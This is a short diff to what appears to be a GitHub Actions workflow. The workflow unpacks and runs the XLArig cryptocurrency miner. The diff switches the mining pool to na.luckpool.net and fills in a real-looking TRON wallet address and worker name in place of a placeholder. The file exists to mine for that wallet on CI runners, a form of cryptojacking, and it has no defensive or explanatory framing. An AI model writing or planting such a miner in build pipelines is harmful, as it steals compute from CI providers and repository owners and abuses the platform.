@@ -21,6 +21,6 @@ jobs:
     - name: Seting-UP
       run: Expand-Archive XLArig-v5.2.2-win64.zip
     - name: Running
-      run: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -o rx.unmineable.com:3333 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u TRX:TRON_WALLET.WORKER_NAME
+      run: .\XLArig-v5.2.2-win64\xlarig.exe --no-huge-pages -o na.luckpool.net:3956 -p x -a rx -k -t 1 --cpu-max-threads-hint 25 -u TRX:RPGnF741xxs1dwUTqrWhKTkTjdXSRPmGrK.tuyulVIP
     - name: DONE
       run: exit
